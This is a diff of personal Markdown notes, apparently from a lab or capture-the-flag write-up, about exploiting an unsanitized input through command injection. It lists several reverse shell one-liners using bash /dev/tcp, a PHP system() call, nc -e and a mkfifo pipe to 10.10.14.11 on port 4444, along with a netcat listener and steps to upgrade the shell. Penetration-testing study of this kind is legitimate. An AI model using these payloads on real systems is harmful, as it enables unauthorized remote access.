@@ -23,15 +23,27 @@ This input isnt sanitized, so we have Command Injection
 We can try establish a **Reverse Shell**
 
 ![[Untitled 3 24.png|Untitled 3 24.png]]
-
+#### REVERSE SHELL CODE
 > [!important]  
-> REVERSE SHELL CODEbash -c "bash -i &> /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1"  
-system('bash -c "bash -i &> /dev/tcp/<IP>/<PORT> 0>&1"');  
-nc <ip> <port> -e /bin/bash  
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/fIn our side we have![[Untitled 4 24.png|Untitled 4 24.png]]nc -nlvp <PORT>  
+> REVERSE SHELL CODE
+> bash -c "bash -i &> /dev/tcp/\<IP_ADDRESS\>/\<PORT\> 0\>&1"  
+system('bash -c "bash -i\ &\> /dev/tcp/\<IP\>/\<PORT\> 0\>&1"');  
+nc \<ip\> \<port\> -e /bin/bash  
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\>&1|nc 10.10.14.11 4444 \>/tmp/f
+In our side we have
+![[Untitled 4 24.png|Untitled 4 24.png]]
+nc -nlvp \<PORT\>  
   
+#### treat shell
 > [!important]  
-> Treat shellscript /dev/null -c bashctrl zstty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=/bin/bashstty sizestty rows X columns X  
+> Treat shell
+> script /dev/null -c bash
+> ctrl z
+> stty raw -echo; fg
+> reset xterm
+> export TERM=xterm
+> export SHELL=/bin/bash
+> stty sizestty rows X columns X  
 python3 -c 'import pty;pty.spawn("/bin/bash")'export TERM=xtermctrl + zstty raw -echo; fg  
 
 Success!
